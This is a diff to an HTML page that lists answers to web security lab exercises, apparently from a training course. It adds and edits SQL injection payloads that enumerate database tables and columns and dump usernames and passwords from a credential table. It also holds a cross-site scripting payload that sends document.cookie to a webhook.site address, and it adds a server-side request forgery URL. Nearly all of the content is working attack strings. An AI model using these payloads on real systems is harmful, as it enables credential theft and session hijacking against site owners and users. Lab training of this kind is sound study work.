@@ -14,9 +14,11 @@
 
     <h3>exercise SQLi2</h3>
     <h4>Find table names</h4>
-    <p>AnnoyingWorm' UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM information_schema.TABLES-- </p>
+    <p>' UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM information_schema.TABLES-- </p>
+    <h4>Find fields</h4>
+    <p>' UNION ALL SELECT NULL, NULL, NULL, column_name FROM information_schema.columns WHERE table_name="SQLi2_Credential" -- </p>
     <h4>Find credentials</h4>
-    <p>AnnoyingWorm' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
+    <p>' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
 
 
     <h4>SQLi3</h4>
@@ -55,5 +57,9 @@ print(f'Final out data: {out}')
 
     <h3>exercise XXS2</h3>
     <p><[togliere]img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='https://webhook.site/36084a1e-320d-49fb-a419-91f163aa76d6/?c='+document.cookie></p>
+
+    <h3>exercise SSRF1</h3>
+    <p>http://localtest.me/SSRF/SSRF1/secret</p>
+
 </body>
 </html>
